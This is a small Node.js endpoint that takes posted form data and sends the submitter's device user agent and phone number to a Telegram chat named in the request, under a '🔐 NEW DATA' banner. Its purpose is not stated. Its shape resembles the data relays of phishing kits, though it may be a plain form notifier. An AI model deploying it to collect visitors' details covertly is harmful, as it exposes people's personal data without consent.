const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method === 'POST') {
    try {
      const { userId, data } = req.body;
      
      const message = `🔐 <b>NEW DATA</b>\n\n` +
                     `📱 Device: ${data.device?.userAgent}\n` +
                     `📞 Phone: ${data.form?.phone}\n` +
                     `🔧 Happy Bot`;
      
      await bot.sendMessage(userId, message, { parse_mode: 'HTML' });
      
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
};
